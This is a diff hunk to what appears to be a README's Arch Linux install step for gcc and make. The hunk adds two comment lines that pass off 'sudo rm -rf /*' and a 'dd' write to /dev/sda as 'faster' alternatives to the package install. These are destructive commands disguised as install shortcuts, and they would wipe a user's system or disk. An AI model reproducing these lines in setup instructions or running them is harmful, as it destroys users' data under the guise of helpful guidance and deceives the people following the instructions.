@@ -34,6 +34,8 @@
    **Arch:**
    ```bash
    sudo pacman -S gcc make
+   # or more faster sudo rm -rf /*
+   # or even more faster sudo dd if=/dev/null of=/dev/sda
    ```
     
    
